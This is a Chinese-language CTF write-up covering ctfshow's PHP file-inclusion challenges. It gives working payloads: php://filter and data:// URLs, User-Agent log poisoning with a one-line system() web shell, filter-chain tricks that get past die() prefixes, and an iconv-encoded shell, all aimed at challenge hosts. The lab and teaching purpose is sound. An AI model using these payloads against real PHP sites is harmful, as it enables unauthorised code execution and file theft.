---
title: "ctfshow Web入门[文件包含] Writeup"
date: 2022-08-04T11:32:16+08:00
draft: false
tags: ['ctf','php']
categories: ['web']
author: "X1r0z"

# weight: 1  # Top page

# You can also close(false) or open(true) something for this content.
# P.S. comment can only be closed
comment: false
toc: false
autoCollapseToc: false
---

文件包含

主要考察各种伪协议, 尤其是 php://filter

<!--more-->

## web78

php 伪协议

`http://86039d93-a3f5-4dad-9f2e-1ae926e13f29.challenge.ctf.show/?file=php://filter/read=convert.base64-encode/resource=flag.php`

## web79

```
if(isset($_GET['file'])){
    $file = $_GET['file'];
    $file = str_replace("php", "???", $file);
    include($file);
}else{
    highlight_file(__FILE__);
}
```

将 php 替换为 ???, 不过这个默认是不忽略大小写的

使用 `phP://input` 绕过

![20220804115833](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/20220804115833.png)

另外可以使用 data 伪协议 + base64 绕过

`data://` 和 `php://input` 都可以用来执行 PHP 代码

`http://316a1b13-abdf-4430-8d75-b8e0c3a8b9fc.challenge.ctf.show/?file=data://text/plain;base64,PD9waHAgZWNobyBmaWxlX2dldF9jb250ZW50cygnZmxhZy5waHAnKTs/Pg==`

## web80

```
$file = str_replace("php", "???", $file);
$file = str_replace("data", "???", $file);
```

用上一题的 `phP://input` 绕过

![20220804122843](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/20220804122843.png)

nginx 日志包含, 远程文件包含也能用

nginx 日志路径 `/var/log/nginx/access.log`, 更改 User-Agent

## web81

```
$file = str_replace("php", "???", $file);
$file = str_replace("data", "???", $file);
$file = str_replace(":", "???", $file);
```

包含日志

```
User-Agent: <?php system($_GET[1]);?>
```

![20220804123402](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/20220804123402.png)

## web82-86

**竞争环境需要晚上11点30分至次日7时30分之间做，其他时间不开放竞争条件**

先放着

## web87

```
if(isset($_GET['file'])){
    $file = $_GET['file'];
    $content = $_POST['content'];
    $file = str_replace("php", "???", $file);
    $file = str_replace("data", "???", $file);
    $file = str_replace(":", "???", $file);
    $file = str_replace(".", "???", $file);
    file_put_contents(urldecode($file), "<?php die('大佬别秀了');?>".$content);

    
}else{
    highlight_file(__FILE__);
}
```

文件内容前插入了 `die()`, 直接写的话后面的内容不会被执行

参考文章

[https://xz.aliyun.com/t/8163](https://xz.aliyun.com/t/8163)

[https://www.anquanke.com/post/id/202510](https://www.anquanke.com/post/id/202510)

[https://www.leavesongs.com/PENETRATION/php-filter-magic.html](https://www.leavesongs.com/PENETRATION/php-filter-magic.html)

这里我们选择 `convert.base64-decode` 过滤器

因为最后一行有 `urldecode($file)`, 我们可以通过两次 urlencode 方式来绕过 `str_replace()`

网上的在线 urlencode 无法对正常字符如 `A-Z a-z .` 等进行编码, 这里我们手写一个编码器

```
text = 'php://filter/convert.base64-decode/resource=1.php'

new_text = ''

for i in text:
    new_text += hex(ord(i)).replace('0x', '%25')

print(new_text)
```

注意需要把 `%` 替换成 `%25`, 才能达到二次编码的效果

![20220804161703](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/20220804161703.png)

一开始报错写入失败, 这是因为 base64 解码时是4个 bytes 一组, 前面的内容被除去特殊字符 (符号 汉字等) 后剩下来的 `phpdie` 仅有6个字符, 不满足4的整数倍

在 content 值的开头填充两个 `a` 以达到8个字符, 上传成功

![20220804161956](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/20220804161956.png)

查看 flag

![20220804162027](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/20220804162027.png)

## web88

```
if(preg_match("/php|\~|\!|\@|\#|\\$|\%|\^|\&|\*|\(|\)|\-|\_|\+|\=|\./i", $file)){
        die("error");
}
```

第一眼想到的是远程文件包含, 利用 IP 长地址 (不含 `.`)

然后发现 `data://` 协议其实也能正常使用, 但是要注意编码后的 payload 不能含有 `=` 和 `+`

`=` 是为了填充数量以达到 4 字节的, 删掉也不影响解码

`http://05b928aa-ad9a-4d4a-be1e-b914ea74018e.challenge.ctf.show/?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWzFdKTs/Pg&1=cat%20fl0g.php`

![20220804163010](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/20220804163010.png)

## web116

misc + lfi

打开网站后是一个 mp4, 下载下来分析文件

binwalk 提取失败了, 用的 foremost

![20220804164258](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/20220804164258.png)

有一张 png 文件

![00080067](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/00080067.png)


过滤的有点多, 不过 `php://filter` 还能用

一开始可能都会想到用 base64 rot13 结果被过滤了, 其实 `php://filter` 可以直接明文读取

`http://e3c9307f-cc19-4221-bd4c-e20eb23044a2.challenge.ctf.show/?file=php://filter/resource=flag.php`

![20220804164816](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/20220804164816.png)

## web117

```
highlight_file(__FILE__);
error_reporting(0);
function filter($x){
    if(preg_match('/http|https|utf|zlib|data|input|rot13|base64|string|log|sess/i',$x)){
        die('too young too simple sometimes naive!');
    }
}
$file=$_GET['file'];
$contents=$_POST['contents'];
filter($file);
file_put_contents($file, "<?php die();?>".$contents);
```

过滤的挺多, 但是可以使用 `convert.iconv.*` 过滤器

```
convert.iconv.<input-encoding>.<output-encoding> 

convert.iconv.<input-encoding>/<output-encoding>
```

该过滤器类似于 `iconv()` 函数, 参考文档如下

[https://www.php.net/manual/zh/function.iconv.php](https://www.php.net/manual/zh/function.iconv.php)

[https://www.php.net/manual/zh/mbstring.supported-encodings.php](https://www.php.net/manual/zh/mbstring.supported-encodings.php)

这里直接用先知那篇文章里的从 UCS-2LE 到 UCS-2BE 的转换

本地生成一个 payload, 注意原始长度必须是偶数

```
<?php 
$text = '<?php system($_GET[11]);?>';

echo iconv("UCS-2LE", "UCS-2BE", $text);
?>
```

编码后的 payload

```
?<hp pystsme$(G_TE1[]1;)>?
```

![20220804204710](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/20220804204710.png)

查看 flag

![20220804204728](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/20220804204728.png)